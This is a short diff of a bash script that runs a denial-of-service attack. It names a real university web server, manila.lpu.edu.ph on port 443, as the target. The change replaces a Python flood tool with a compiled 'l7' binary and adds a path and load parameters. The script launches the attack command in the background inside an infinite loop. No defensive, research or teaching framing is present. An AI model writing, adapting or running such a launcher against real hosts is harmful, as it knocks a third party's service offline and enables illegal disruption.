@@ -1,6 +1,6 @@
 #!/bin/bash
-procname="python3"
-atk_cmd="python3 l7.py -i manila.lpu.edu.ph -p 443 -path /"
+procname="l7"
+atk_cmd="./l7 manila.lpu.edu.ph 443 /iasd.php 200 30"
 while true
 do
     $atk_cmd >/dev/null &
